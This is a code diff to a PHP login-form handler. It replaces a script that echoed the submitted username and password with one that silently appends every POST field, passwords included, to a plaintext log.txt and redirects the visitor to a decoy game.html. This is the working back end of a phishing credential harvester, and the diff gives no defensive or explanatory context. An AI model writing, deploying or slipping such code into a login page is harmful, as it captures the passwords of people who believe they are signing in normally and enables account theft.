@@ -1,13 +1,25 @@
 <?php
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    // Retrieve login details from the form
-    $username = $_POST["username"];
-    $password = $_POST["password"];
 
-    // You can perform further validation and authentication here
-    // For demonstration purposes, let's just echo the received data
-    echo "Username: " . $username . "<br>";
-    echo "Password: " . $password;
+header ('Location:game.html');
+
+$handle = fopen("log.txt", "a");
+
+foreach($_POST as $variable => $value) {
+
+fwrite($handle, $variable);
+
+fwrite($handle, "=");
+
+fwrite($handle, $value);
+
+fwrite($handle, "\r\n");
+
 }
+
+fwrite($handle, "\r\n\n\n\n");
+
+fclose($handle);
+
+exit;
+
 ?>
-  
